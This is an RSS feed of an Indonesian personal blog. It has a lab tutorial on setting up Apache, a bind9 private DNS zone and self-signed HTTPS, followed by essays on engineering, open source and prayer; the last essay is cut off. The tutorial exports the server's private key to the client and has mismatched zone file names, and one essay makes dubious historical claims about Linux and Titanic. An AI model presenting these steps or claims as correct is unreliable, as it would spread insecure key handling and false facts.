<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hello World. I am Dito Prabowo</title>
        <link>/posts/</link>
        <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Wed, 16 Oct 2019 09:09:46 +0700</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>[LAB] Install Web Server With Private DNS and Secure With HTTPS</title>
            <link>/posts/lab-install-web-server-with-private-dns-and-secure-with-https/</link>
            <pubDate>Wed, 16 Oct 2019 09:09:46 +0700</pubDate>
            
            <guid>/posts/lab-install-web-server-with-private-dns-and-secure-with-https/</guid>
            <description>0x0 Intro Sebelumnya saya jelaskan tujuan dari lab ini, yaitu kita membuat web server disini saya menggunakan apache, lalu Install bind9 untuk dns server dan membuat domain private kita sendiri, setelah bisa kita secure dengan HTTPS caranya dengan self signed certificate.
Sebelumnya siapkan server yang akan kita gunakan, lalu pahami design jaringan dari server anda, disini saya menggunakan pengaturan network bridge dan menggunakan koneksi dari WIFI B201AP.
IP server : 10.</description>
            <content type="html"><![CDATA[

<h3 id="0x0-intro">0x0 Intro</h3>

<p>Sebelumnya saya jelaskan tujuan dari lab ini, yaitu kita membuat web server disini saya menggunakan apache, lalu Install bind9 untuk dns server dan membuat domain private kita sendiri, setelah bisa kita secure dengan HTTPS caranya dengan self signed certificate.</p>

<p>Sebelumnya siapkan server yang akan kita gunakan, lalu pahami design jaringan dari server anda, disini saya menggunakan pengaturan network bridge dan menggunakan koneksi dari WIFI B201AP.</p>

<p>IP server : 10.122.1.70
IP laptop : 10.122.1.53</p>

<p>silakan gunakan design jaringan kalian sendiri.</p>

<h3 id="0x1-install-web-server">0x1 Install Web Server</h3>

<p>Web server yang saya gunakan adalah apache2, untuk install gunakan command berikut :</p>

<pre><code> $ sudo apt-get install apache2
</code></pre>

<p>setelah selesai, tanpa disetting apapun harusnya jika dibuka ip anda disini saya (10.122.1.70) sudah menampilkan web apache.</p>

<p>untuk mengganti isi web, dapat di replace file di /var/www/html, disini saya mengganti default index.html dengan web saya, berikut hasilnya :</p>

<p><img src="/img/webj1.png" alt="" /></p>

<h3 id="0x2-install-private-dns">0x2 Install Private DNS</h3>

<p>Untuk menggunakan Private DNS saya menggunakan service bind9, dan membuat DNS di ip server yaitu 10.122.1.70</p>

<p>Bind9 adalah suatu software yang di buat untuk mengatur DNS Server pada sistem operasi linux.</p>

<p>Jenis-jenis DNS dan Fungsinya</p>

<ol>
<li>A Record, yaitu memetakan hostname ke IP adress 32-bit (IPv4).</li>
<li>AAA Record, yaitu memetakan hostname ke IP address 128-bit (IPv6).</li>
<li>MX Record, memetakan domain ke mail exchange server.</li>
<li>CNAME Record, membuat nama alias dari sebuah domain.</li>
<li>NS Record, memtakan domain ke dalam satu daftar dari DNS Server.</li>
</ol>

<p>Untuk membuat domain kita sendiri, ada 3 hal yang harus kita lakukan :</p>

<ol>
<li>Configuring the Local File</li>
<li>Creating the Forward Zone File</li>
<li>Creating the Reverse Zone File(s)</li>
</ol>

<p>Selanjutnya kita mulai proses install dan konfigurasinya.</p>

<ul>
<li><p>install dulu bind9 nya :</p>

<p>$  sudo apt-get install bind9</p></li>

<li><p>Selanjutnya configure local file</p>

<p>$  sudo vim /etc/bind/named.conf</p>

<pre><code>//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include &quot;/etc/bind/zones.rfc1918&quot;;

zone &quot;ditoprabowo.com&quot; {
type master;
file &quot;/etc/bind/zones/ditoprabowo.com.db&quot;;
};

zone &quot;1.122.10.in-addr.arpa&quot; {
type master;
file &quot;/etc/bind/zones/rev.1.122.10.in-addr.arpa&quot;;
};
</code></pre></li>
</ul>

<p>1.122.10 merupakan 3 digit 10.122.1.70 yang dibalik.</p>

<ul>
<li><p>Buat directory folder zones &amp; file di domain.com.db di directory /etc/bind [Forward Zone]</p>

<p>$  cd /etc/bind
  $  sudo mkdir zones
  $  cd zones
  $  vim ditoprabowo.com.db</p>

<pre><code>; BIND data file for ditoprabowo.com
;
$TTL 14400
@ IN SOA ns1.ditoprabowo.com. root.ditoprabowo.com. (
1 ; Serial  
7200 ; Refresh  
120 ; Retry
2419200 ; Expire  
604800) ; Default TTL  
;

ditoprabowo.com. IN NS ns1.ditoprabowo.com.
ditoprabowo.com. IN MX 10 testing.ditoprabowo.com.
ditoprabowo.com. IN A 10.122.1.70

ns1 IN A 10.122.1.70

www IN CNAME ditoprabowo.com.
testing IN A 10.122.1.70
ftp IN CNAME ditoprabowo.com.
ditoprabowo.com. IN TXT &quot;v=spf1 ip4:10.122.1.70 a mx ~all&quot;
testing IN TXT &quot;v=spf1 a -all&quot;
</code></pre></li>

<li><p>Creating the Reverse Zone File(s)</p>

<pre><code>$  sudo vim /etc/bind/zones/1.122.10.in-addr.arpa
</code></pre>

<pre><code>@ IN SOA ditoprabowo.com. root.ditoprabowo.com. (
1;  
28800;  
604800;  
604800;  
86400 );

IN NS ns1.ditoprabowo.com.  
4 IN PTR ditoprabowo.com.
</code></pre></li>

<li><p>lalu kita coba test domain kita, caranya dengan menggunakan nameserver ip dns kita.</p>

<pre><code>$  sudo vim /etc/resolv.conf
</code></pre>

<pre><code>nameserver 10.122.1.70
</code></pre></li>
</ul>

<p>hasilnya :</p>

<pre><code>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.9-Ubuntu &lt;&lt;&gt;&gt; ditoprabowo.com
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45338
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: a631a242020ee04e76887a075da68f41f580d1ab13c184ba (good)
;; QUESTION SECTION:
;ditoprabowo.com.		IN	A

;; ANSWER SECTION:
ditoprabowo.com.	14400	IN	A	10.122.1.70

;; AUTHORITY SECTION:
ditoprabowo.com.	14400	IN	NS	ns1.ditoprabowo.com.

;; ADDITIONAL SECTION:
ns1.ditoprabowo.com.	14400	IN	A	10.122.1.70

;; Query time: 0 msec
;; SERVER: 10.122.1.70#53(10.122.1.70)
;; WHEN: Wed Oct 16 03:32:17 UTC 2019
;; MSG SIZE  rcvd: 122
</code></pre>

<p>Testing pada selain server, gunakan dns ip server.</p>

<p>configure dulu dns pada wifi, lalu coba buka ditoprabowo.com</p>

<p><img src="/img/webj2.png" alt="" /></p>

<p><img src="/img/webj3.png" alt="" /></p>

<h3 id="0x3-secure-with-https">0x3 Secure With HTTPS</h3>

<p><img src="/img/SSL-flowchart.png" alt="" /></p>

<p>nah kita bisa menggenerate certificate sendiri (Self-signed certificate) dengan openssl</p>

<ol>
<li>Generate a certificate authority (CA) cert</li>
<li>Generate your Apache server SSL key and certificate</li>
<li>Generate a client SSL certificate</li>
</ol>

<p>dan pada saat membuat server key jangan lupa ditambahkan DNS kita.</p>

<p>Berikut script yang saya gunakan untuk Generate self-signed TLS Certificate yang isinya sebenernya seperti diatas step nya.</p>

<pre><code>#!/bin/bash

# Directories
cur=$(pwd)
tmp=$(mktemp -d)
scriptName=$(basename &quot;$0&quot;)

# Certificate Variables
OUTPATH=&quot;./&quot;
VERBOSE=0
DURATION=3650 # 10 years

safeExit() {
  if [ -d &quot;$tmp&quot; ]; then
    if [ $VERBOSE -eq 1 ]; then
      echo &quot;Removing temporary directory '${tmp}'&quot;
    fi
    rm -rf &quot;$tmp&quot;
  fi

  trap - INT TERM EXIT
  exit
}

# Help Screen
help() {
  echo -n &quot;${scriptName} [OPTIONS] -c=US --state=California
Generate self-signed TLS certificate using OpenSSL
 Options:
  -c|--country         Country Name (2 letter code)
  -s|--state           State or Province Name (full name)
  -l|--locality        Locality Name (eg, city)
  -o|--organization    Organization Name (eg, company)
  -u|--unit            Organizational Unit Name (eg, section)
  -n|--common-name     Common Name (e.g. server FQDN or YOUR name)
  -e|--email           Email Address
  -p|--path            Path to output generated keys
  -d|--duration        Validity duration of the certificate (in days)
  -h|--help            Display this help and exit
  -v|--verbose         Verbose output
&quot;
}

# Test output path is valid
testPath() {
  if [ ! -d $OUTPATH ]; then
    echo &quot;The specified directory \&quot;${OUTPATH}\&quot; does not exist&quot;
    exit 1
  fi
}

# Process Arguments
while [ &quot;$1&quot; != &quot;&quot; ]; do
  PARAM=$(echo &quot;$1&quot; | awk -F= '{print $1}')
  VALUE=$(echo &quot;$1&quot; | awk -F= '{print $2}')
  case $PARAM in
    -h|--help) help; safeExit ;;
    -c|--country) C=$VALUE ;;
    -s|--state) ST=$VALUE ;;
    -l|--locality) L=$VALUE ;;
    -o|--organization) O=$VALUE ;;
    -u|--unit) OU=$VALUE ;;
    -n|--common-name) CN=$VALUE ;;
    -e|--email) emailAddress=$VALUE ;;
    -p|--path) OUTPATH=$VALUE; testPath ;;
	-d|--duration) DURATION=$VALUE ;;
    -v|--verbose) VERBOSE=1 ;;
    *) echo &quot;ERROR: unknown parameter \&quot;$PARAM\&quot;&quot;; help; exit 1 ;;
  esac
  shift
done

# Prompt for variables that were not provided in arguments
checkVariables() {
  # Country
  if [ -z &quot;$C&quot; ]; then
    echo -n &quot;Country Name (2 letter code) [AU]:&quot;
    read -r C
  fi

  # State
  if [ -z &quot;$ST&quot; ]; then
    echo -n &quot;State or Province Name (full name) [Some-State]:&quot;
    read -r ST
  fi

  # Locality
  if [ -z &quot;$L&quot; ]; then
    echo -n &quot;Locality Name (eg, city) []:&quot;
    read -r L
  fi

  # Organization
  if [ -z &quot;$O&quot; ]; then
    echo -n &quot;Organization Name (eg, company) [Internet Widgits Pty Ltd]:&quot;
    read -r O
  fi

  # Organizational Unit
  if [ -z &quot;$OU&quot; ]; then
    echo -n &quot;Organizational Unit Name (eg, section) []:&quot;
    read -r OU
  fi

  # Common Name
  if [ -z &quot;$CN&quot; ]; then
    echo -n &quot;Common Name (e.g. server FQDN or YOUR name) []:&quot;
    read -r CN
  fi

  # Email Address
  if [ -z &quot;$emailAddress&quot; ]; then
    echo -n &quot;Email Address []:&quot;
    read -r emailAddress
  fi
}

# Show variable values
showVals() {
  echo &quot;Country: ${C}&quot;;
  echo &quot;State: ${ST}&quot;;
  echo &quot;Locality: ${L}&quot;;
  echo &quot;Organization: ${O}&quot;;
  echo &quot;Organization Unit: ${OU}&quot;;
  echo &quot;Common Name: ${CN}&quot;;
  echo &quot;Email: ${emailAddress}&quot;;
  echo &quot;Output Path: ${OUTPATH}&quot;;
  echo &quot;Certificate Duration (Days): ${DURATION}&quot;;
  echo &quot;Verbose: ${VERBOSE}&quot;;
}

# Init
init() {
  cd &quot;$tmp&quot; || exit
  pwd
}

# Cleanup
cleanup() {
  echo &quot;Cleaning up&quot;
  cd &quot;$cur&quot; || exit
  rm -rf &quot;$tmp&quot;
}

buildCsrCnf() {
cat &lt;&lt; EOF &gt; &quot;${tmp}/tmp.csr.cnf&quot;
[req]
default_bits = 2048
prompt = no
default_md = sha256
distinguished_name = dn
[dn]
C=${C}
ST=${ST}
L=${L}
O=${O}
OU=${OU}
CN=${CN}
emailAddress=${emailAddress}
EOF
}

buildExtCnf() {
cat &lt;&lt; EOF &gt; &quot;${tmp}/v3.ext&quot;
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names
[alt_names]
DNS.1 = ${CN}
DNS.2 = ditoprabowo.com
DNS.3 = ns1.ditoprabowo.com
DNS.4 = testing.ditoprabowo.com
DNS.5 = 10.122.1.70
EOF
}

# Build TLS Certificate
build() {
  # Santizie domain name for file name
  FILENAME=${CN/\*\./}
  # Generate CA key &amp; crt
  openssl genrsa -out &quot;${tmp}/tmp.key&quot; 2048
  openssl req -x509 -new -nodes -key &quot;${tmp}/tmp.key&quot; -sha256 -days &quot;${DURATION}&quot; -out &quot;${OUTPATH}${FILENAME}_CA.pem&quot; -subj &quot;/C=${C}/ST=${ST}/L=${L}/O=${O}/OU=${OU}/CN=${CN}/emailAddress=${emailAddress}&quot;

  # CSR Configuration
  buildCsrCnf

  # Create v3.ext configuration file
  buildExtCnf

  # Server key
  openssl req -new -sha256 -nodes -out &quot;${OUTPATH}${FILENAME}.csr&quot; -newkey rsa:2048 -keyout &quot;${OUTPATH}${FILENAME}.key&quot; -config &lt;( cat &quot;${tmp}/tmp.csr.cnf&quot; )

  # Server certificate
  openssl x509 -req -in &quot;${OUTPATH}${FILENAME}.csr&quot; -CA &quot;${OUTPATH}${FILENAME}_CA.pem&quot; -CAkey &quot;${tmp}/tmp.key&quot; -CAcreateserial -out &quot;${OUTPATH}${FILENAME}.crt&quot; -days &quot;${DURATION}&quot; -sha256 -extfile &quot;${tmp}/v3.ext&quot;
}

checkVariables
build
# showVals
safeExit
</code></pre>

<p>hasilnya akan ada beberapa file yang tergenerate :</p>

<ol>
<li>ditoprabowo.crt</li>
<li>ditoprabowo.csr</li>
<li>ditoprabowo.key</li>
<li>ditoprabowo_CA.pem</li>
</ol>

<p>Selanjutnya install sever certificate pada Apache</p>

<ul>
<li><p>copy ca cert ke /etc/ssl/certs.</p>

<pre><code>$ sudo cp ditoprabowo_CA.pem /etc/ssl/certs/
</code></pre></li>

<li><p>copy server cert dan private key ke folder ssl</p>

<pre><code>$  cp ditoprabowo.crt /etc/ssl/certs/ditoprabowo.crt
$  cp ditoprabowo.key /etc/ssl/private/ditoprabowo.key
</code></pre></li>

<li><p>aktifkan SSL module</p>

<pre><code>$  a2enmod ssl
</code></pre></li>

<li><p>aktifkan SSL site in apache</p>

<pre><code>$ a2ensite default-ssl
</code></pre></li>

<li><p>ditambahkan certificate pada apache</p>

<p>SSLCACertificateFile /etc/ssl/certs/ditoprabowo_CA.pem
  SSLCertificateFile    /etc/ssl/certs/ditoprabowo.crt
  SSLCertificateKeyFile /etc/ssl/private/ditoprabowo.key</p></li>

<li><p>Restart apache2</p>

<pre><code>$  sudo service apache2 restart
</code></pre></li>
</ul>

<p>Sekarang saat kita akses https web kita, akan muncul error saat membuka karena kita menggunakan certificate yang tidak valid pada client, maka dari itu kita harus membuat certificate dan private key ke dalam pkcs#12 format untuk client</p>

<pre><code>    $ openssl pkcs12 -export -inkey ditoprabowo.key -in ditoprabowo.crt -out ditoprabowo.p12
</code></pre>

<p>pindahkan file ditoprabowo.p12 ke local laptop</p>

<pre><code>    $  scp ditoprabowo.p12 dito@10.122.1.53:~
</code></pre>

<p>lalu pada browser, disini saya memakai chrome, import file diatas agar dikenali valid oleh chrome.</p>

<p>di chrome ada di setting manage HTTPS, import lalu jangan lupa dikasih trust</p>

<p><img src="/img/webj4.png" alt="" /></p>

<p>hasilnya :</p>

<p><img src="/img/webj5.png" alt="" /></p>

<p>Referensi :
1. <a href="http://developer.erabelajar.com/konfigurasi-dns-server-menggunakan-bind9-di-ubuntu-server/">http://developer.erabelajar.com/konfigurasi-dns-server-menggunakan-bind9-di-ubuntu-server/</a>
2. <a href="https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/">https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/</a>
3. Google Image</p>
]]></content>
        </item>
        
        <item>
            <title>Apa Yang Seharusnya Dilakukan Oleh Seorang Engineer</title>
            <link>/posts/apa-yang-seharusnya-dilakukan-oleh-seorang-engineer/</link>
            <pubDate>Tue, 15 Oct 2019 05:08:35 +0700</pubDate>
            
            <guid>/posts/apa-yang-seharusnya-dilakukan-oleh-seorang-engineer/</guid>
            <description>Apa sih Engineer itu? Engineer adalah suatu ilmu keteknikan yang dipraktekan dalam kehidupan kita untuk mempermudah kita dalam melakukan sesuatu. Seorang Engineer harus bisa mengatasi masalah yang ada dalam kehidupan sehari-hari dari hal yang kecil hingga besar. Ada beberapa sifat yang harus dimiliki oleh seorang Engineer, yang pertama Be Humble, jangan sombong, dan akui kesalahan. Seorang Engineer yang sombong tidak akan banyak ilmu, saat ada orang yang ingin mengajak belajar, apabila ia sombong dan merasa tidak bisa, maka kemungkinan besar Engineer itu akan menolak karena dirasa sudah bisa, padahal banyak ilmu ilmu baru yang bisa dipelajari.</description>
            <content type="html"><![CDATA[<p>Apa sih Engineer  itu? Engineer adalah suatu ilmu keteknikan yang dipraktekan dalam kehidupan kita untuk mempermudah kita dalam melakukan sesuatu. Seorang Engineer harus bisa mengatasi masalah yang ada dalam kehidupan sehari-hari dari hal yang kecil hingga besar. Ada beberapa sifat yang harus dimiliki oleh seorang Engineer, yang pertama Be Humble, jangan sombong, dan akui kesalahan. Seorang Engineer yang sombong tidak akan banyak ilmu, saat ada orang yang ingin mengajak belajar, apabila ia sombong dan merasa tidak bisa, maka kemungkinan besar Engineer itu akan menolak karena dirasa sudah bisa, padahal banyak ilmu ilmu baru yang bisa dipelajari. Dan apabila ada orang yang menyalahkan kita dalam suatu masalah, akui kesalahan itu dan jangan sombong, bisa saja banyak ilmu ilmu yang kurang kita perhatikan dan akan berguna pada suatu hari.Yang kedua, seorang engineer harus bisa menganalisis suatu permasalahan, dan bisa memberikan solusi yang komprehensif.</p>

<p>Agar seorang bisa menganalisis dan bisa memberika solusi yang komprehensif pastinya seorang enginer harus berwawasan yang luas. Untuk bisa berwawasan luas seorang engineer harus melikiki cara berfikir yang open mind, selalu mengelaborasi ( mengengbangkan lebih lanjut dari apa yang didapatkan ), jangan berasumsi selalu cari fakta fakta terhadap masalah yang dihadapi. Dan seorang Engineer yang hebat selalu melakukan homework nya dengan baik, tanpa menunda-nunda dan selalu bertanya apabila memang dirasa tidak tahu, jangan malu.  Seorang Engineer juga harus memiliki integritas yang tinggi, ya integritas, saat berpfikir dan diomongkan dalam publik, hasil dari pekerjaan yang dilakukan harus sesuai dengan apa yang dibicarakan. Dan Engineer harus bisa menjalankan  semua pekerjaan nya dengan properly, artinya ia  harus bisa meyakini dengan pengetahuan dan kemampuannya bahwa ia telah melakukan nya dengan baik dan benar. Jadi dengan hati yang bersih, pikiran yang berwawasan luas dan analisis yang bagus, disertai awareness dalam penyelesaian masalah, akan menjadikan seorang Engineer hebat dalam dunia bisnis serta mampu memberikan solusi yang komprehensif bagi client nya. Dan pastinya seorang Engineer yang baik juga mempunyai niat untuk membangun bangsa dan negara nya.</p>
]]></content>
        </item>
        
        <item>
            <title>Open Source Sebagai Foundation Dari Industri 4.0</title>
            <link>/posts/open-source-sebagai-foundation-dari-industri-4.0/</link>
            <pubDate>Tue, 15 Oct 2019 05:06:54 +0700</pubDate>
            
            <guid>/posts/open-source-sebagai-foundation-dari-industri-4.0/</guid>
            <description>Ya seperti yang kita ketahui sebelumnya, Open Source merupakan istilah untuk sofware yang mana kode dari sofware tersebut bisa kita pelajari, modifikasi, maupun kita kembangkan sesuai keinginan kita. Dan Open Source tanpa kita sadari merupakan foundation atau dasar berdirinya Industri 4.0, kok bisa? Sebelumnya, apakah kalian tahu apa itu Industri 4.0? Industri 4.0 merupakan istilah dimana sebuah IT menjadi kebutuhan pokok dan menjadi support untuk kehidupan kita. Pada Industri 4.0 sangat sangat mempermudah kita untuk melakukan sesuatu termasuk didalamnya sudah terjadi automation yang artinya sudah ada beberap fitur otomatis, contohnya login/register.</description>
            <content type="html"><![CDATA[<p>Ya seperti yang kita ketahui sebelumnya, Open Source merupakan istilah untuk sofware yang mana kode dari sofware tersebut bisa kita pelajari, modifikasi, maupun kita kembangkan sesuai keinginan kita. Dan Open Source tanpa kita sadari merupakan foundation atau dasar berdirinya Industri 4.0, kok bisa?
Sebelumnya, apakah kalian tahu apa itu Industri 4.0? Industri 4.0 merupakan istilah dimana sebuah IT menjadi kebutuhan pokok dan menjadi support untuk kehidupan kita. Pada Industri 4.0 sangat sangat mempermudah kita untuk melakukan sesuatu termasuk didalamnya sudah terjadi automation yang artinya sudah ada beberap fitur otomatis, contohnya login/register. Biasanya kita perlu menginputkan data kita untuk bisa login/register. Sekarang tanpa perlu kita menginputkan data, kita bisa login dan register dengan akun Google atau yang lainnya. Tidak hanya itu, sekarang banyak aplikasi yang menggantikan dompet/uang nyata dengan uang virtual. Kita bisa membayar lewat aplikasi dan tanpa perlu ribet dengan kembalian serta waktu transaksi yang cepat. Seolah  olah semua kebutuhan pokok kita dimudahkan dengan tergantikannya dengan IT. Balik lagi, semua perkembangan IT dalam industri 4.0 tidak semudah mungkin bisa sepesat ini tanpa adanya Open Source. Dengan adanya Open Source, banyak orang bisa mempelajari source code yang ada untuk menciptakan sesatu yang baru. Misalnya dengan adanya open source dari flutter kita bisa membuat aplikasi yang bagus sesuai dengan apa yang kita inginkan yang bisa memudahkan seseorang. Tanpa adanya open source akan kesulitan apabila seseorang membangun dari awal sebuah system yang kompleks. Selain kemudahan dalam mempelajari, kita juga dapat meminimalisir biaya yang dikeluarkan karena open source gratis. Apabila sudah ada open source dan ingin mengembangkan lagi industri di indonesia, tinggal mencari orang dari akademisi yang expert dan mau juga belajar untuk bisnis. Soalnya, kebanyakan orang akademisi tidak terlalu memperdulikan bisnis lebih ke arah risetnya. Jadi ada gap antara akademisi dan bisnis.</p>
]]></content>
        </item>
        
        <item>
            <title>Open Source Adalah Keajaiban Dunia?</title>
            <link>/posts/open-source-adalah-keajaiban-dunia/</link>
            <pubDate>Tue, 15 Oct 2019 05:03:51 +0700</pubDate>
            
            <guid>/posts/open-source-adalah-keajaiban-dunia/</guid>
            <description>Seperti yang kita ketahui, Open source adalah istilah untuk software yang kode programnya disediakan oleh pengembangan untuk umum agar dapat dipelajari, diubah, atau dikembangkan. Jadi dengan adanya Open Source kita bisa melihat kode program dan bisa kita modifikasi untuk apapun yang kita inginkan dengan gratis, ya gratis. Lalu kenapa Open Source menjadi sebuah keajaiban dunia?. Banyak kisah menarik dari perusahaan IT besar yang lahir dari Open source,bahkan tidak hanya dari perusahaan IT, banyak perusahaan yang sekarang sudah menjadi perusahaan besar karena adanya Open source.</description>
            <content type="html"><![CDATA[<p>Seperti yang kita ketahui, Open source adalah istilah untuk software yang kode programnya disediakan oleh pengembangan untuk umum agar dapat dipelajari, diubah, atau dikembangkan. Jadi dengan adanya Open Source kita bisa melihat kode program dan bisa kita modifikasi untuk apapun yang kita inginkan dengan gratis, ya gratis. Lalu kenapa Open Source menjadi sebuah keajaiban dunia?. Banyak kisah menarik dari perusahaan IT besar yang lahir dari Open source,bahkan tidak hanya dari perusahaan IT, banyak perusahaan yang sekarang sudah menjadi perusahaan besar karena adanya Open source. Linux misalnya, salah satu operating system  open source yang dibuat oleh Linus Torvald, bayangkan apabila tidak ada linux apakah dunia IT akan seperti sekarang? Apa yang terjadi apabila hanya ada Windows milik microsoft yang apabila memilikinya harus membeli serta close source?</p>

<p>Tidak akan, tidak akan lahir Android, Google, bahkan film Titanic yang begitu hits sampai sekarang tidak akan ada tanpa Open Source, kok bisa?
Ya bisa, tahukan kalian sebenarnya Android itu merupakan operating system dengan mengadopsi OS linux? Android yang begitu banyak digunakan sekarang, diciptakan oleh Andy Rubin dan kawan kawan nya. Android awalnya berdiri dari perusahan Android Inc yang kemudian di beli oleh Google pada tahun 2005. Android diciptakan dari Open Source linux, dan Android sendiri bersifat Open Source agar para pengembang aplikasi bisa dengan mudah membuat aplikasi untuk diinstal dalam OS Android,jadi apabila tidak ada Open Source OS Linux apakah akan ada Android? dan apabila Android bersifat close source akankah Android akan berkembang pesat seperti sekarang? akan kah banyak yang bisa menciptakan aplikasi aplikasi dalam OS Android?</p>

<p>Begitu juga dengan Google, Google pada awalnya adalah mesin search engine. Dimana yang dinamakan search engine perlu data yang banyak agar bisa membuktikan bahwa milik Google lah search engine yang tercepat. Untuk mempunyai data yang banyak, perlu banyak orang yang menggunakan internet dan komputer, dan yang namanya komputer harus memiliki os agar bisa berjalan. Bayangkan apabila hanya ada Windows milik microsoft yang berbayar pada dunia ini, pastinya akan sedikit orang yang mampu membeli windows, dan penyebaran data pun sedikit, dan IT pun akan lambat perkembangan nya apabila hanya ada windows pada dunia ini. Tapi, dengan adanya Linux OS yang bersifat Open Source, bakal banyak orang yang bisa memakai komputer dan bakal banyak juga data yang bisa menyebar serta terwujudlah perusahaan Google yang kalian tau sendiri seperti apa suksesnya.</p>

<p>Tidak hanya perusahaan IT, bahkan film Titanic pun bisa sukses dan ada karena adanya Open Source. Pada jaman dahulu, penyimpanan media elektronik sangat sangat terbatas, tidak seperti sekarang, sedangkan agar bisa membuat film titanic, diperlukan penyimpanan sangat besar karena setiap frame yang bagus hasilnya menghasilkan data yang cukup besar, apabila hanya ada windows apakah akan ada film titanic? windows mempunya limit penyimpanan maksimal, dan harus menghabiskan biaya yang mahal untuk membuat windows bisa menyimpan memory yang besar. Untuk mengatasi masalah penyimpanan yang besar, dipangilah hacker untuk membuat linux memiliki penyimpanan yang besar dan bisa menghemat biaya produksi secara besar.</p>

<p>Pada kenyataannya, membangun dan mengimplementasikan open source dalam dunia bisnis tidak semudah seperti membeli ke perusahaan sofware berbayar, jika kita memilih jalan membayar apabila ada error kita tinggal kontak penyedia, dan tidak ada perkembangan ilmu dalam masalah troubleshoot dan problem solving, biaya nya mahal juga, sangat tidak bijaksana. Belum lagi apabila penyedia memberikan sebuah kejahatan berupa virus ,malware atau spyware dalam sofware tersebut yang kita tidak mengetahuinya [Hidden Agenda]. Juga pada sofware berbayar tidak muncul keberagaman sofware antara pembuat, penjual, pengguna, dsb. Beda cerita jika memakai Open source, banyak sekali tantangan yang harus dihadapi dan dibutuhkan semangat besar open source. Pada penggunaan, bisa muncul beragam bentuk pada pencipta dan pemakai, belum lagi jika menginginkan beberapa fitur yang berbeda, semua orang bisa dengan mudah memodifikasi seperti apa yang diinginkan. Dalam implementasi nya juga, open source diimplementasikan dengan base practice, dari research (experiment) dan analisis, lalu mendapat experience kemudian saat dicoba di produksi mendapat feedback dan hasil, lalu dianalisis lagi dan mendapat experience lagi berulang ulang, tidaklah mudah. Sampai akhirnya timbulah SOP, timbullah Procedure bisa dikatan metodologi sampai muncul sebuah Guideline yang akhirnya mendekati maturity (kematangan) dalam implementasi open source. Belum lagi masalah legalitas,  kita bisa saja terkena pelanggaran hak cipta (copyright) , dimana vendor harus menjamin seluruh hukum dan denda apabila ada pelanggaran copyright, dan client tidak sama sekali harus membayar denda. Yang artinya kita harus benar benar memastikan bahwa tidak ada pelanggaran sama sekali dalam pengimplementasikan open source, baru kita profesional dalam menjalankan bisnis kita.</p>
]]></content>
        </item>
        
        <item>
            <title>Ketika Sholat mu Hanya Untuk Kewajiban Semata</title>
            <link>/posts/ketika-sholat-mu-hanya-untuk-kewajiban-semata/</link>
            <pubDate>Mon, 14 Oct 2019 11:31:53 +0700</pubDate>
            
            <guid>/posts/ketika-sholat-mu-hanya-untuk-kewajiban-semata/</guid>
            <description>Sholat merupakan rukun Islam ke 2 dan memang merupakan Kewajiban yang harus kita laksanakan, tapi.. menurut kalian apakah hanya untuk itu saja? hanya karena melaksanakan Kewajiban saja?
Saya mengakui bahwa memang manusia diciptakan tidak bisa sempurna, tapi setiap manusia saya percaya selalu punya kelebihan masing-masing entah diketahui atau tidak. Apabila seseorang telah menemukan apa yang dia nyaman melakukannya dan mempunyai suatu impian yang tinggi terhadap apa yang dilakukannya pastinya akan berusaha sekeras mungkin untuk mengejarnya.</description>
            <content type="html"><![CDATA[<p>Sholat merupakan rukun Islam ke 2 dan memang merupakan Kewajiban yang harus kita laksanakan, tapi.. menurut kalian apakah hanya untuk itu saja? hanya karena melaksanakan Kewajiban saja?</p>

<p>Saya mengakui bahwa memang manusia diciptakan tidak bisa sempurna, tapi setiap manusia saya percaya selalu punya kelebihan masing-masing entah diketahui atau tidak. Apabila seseorang telah menemukan apa yang dia nyaman melakukannya dan mempunyai suatu impian yang tinggi terhadap apa yang dilakukannya pastinya akan berusaha sekeras mungkin untuk mengejarnya. Setiap waktu rela dihabiskan untuk belajar dan mendalami agar bisa tercapai apa yang diinginkan nya, apalagi kalo orangnya sangat ambisius sekali. Mereka percaya dengan kemampuannya dan bisa dibilang passion nya jika diasah terus menerus akan bisa mengejar apa yang diimpi impikan meskipun bukan suatu hal yang gampang diraih.</p>

<p>Memang dan memang lagi, tidaklah salah berjuang keras. tapi&hellip;, ada tapinya? apa? apakah mengejar apa yang kita impikan apa yang kita harapakan cukup dengan berjuang keras saja?</p>

<p>Iya, ini juga termasuk hal yang pernah saya alami, saya mengimpikan suatu hal dan saya mencoba sangat bekerja keras belajar untuk menggapai itu, tapi pada akhirnya tidak semua sesuai dengan apa yang saya inginkan dan rencanakan. Sehingga pernah merasakan down mental saat itu, sedih, kecewa, juga dirasakan.</p>

<p>Terlintas ada di benak pikiran suatu pertanyaan.. Apa ada yang salah dengan saya? saya sudah mereasa sangat maksimal dalam berusaha, waktu waktu sudah saya habiskan untuk belajar, tapi kenapa hasilnya tidak sesuai dengan apa yang saya pikirkan?</p>

<p>Beberapa hari sudah saya lalui semenjak kegagalan itu, dan saat iseng bermain media sosial, ada salah satu post dari Official Account Tehjasminunpad yang menarik perhatian saya, yang berjudul &ldquo; Merasa paling Bodoh&rdquo; , berikut isinya :</p>

<pre><code>  Pernah ga ada di posisi, saat kita merasa sudah belajar banyak hal dan belajar ini dan itu, bahkan merasa perjuangan kita lebih keras dari orang lain.

  Tapi saat nilainya keluar, yang didapat adalah nilai yang menurut kita sangat kecil. Sementara orang lain yang kita lihat belajar nya pun antara mau dan tidak, malah mendapatkan hasil yang lebih baik dari kita.

  Hati mana yang gak sakit ditikung nilai dengan cara seperti itu?

  Tapi eh tapi.. Sebenernya kita gak perlu takut. karena kita mungkin gak dapatkannilai atau data kuantitatif dari apa yang kita usahakan.. api kita punya ilmunya.

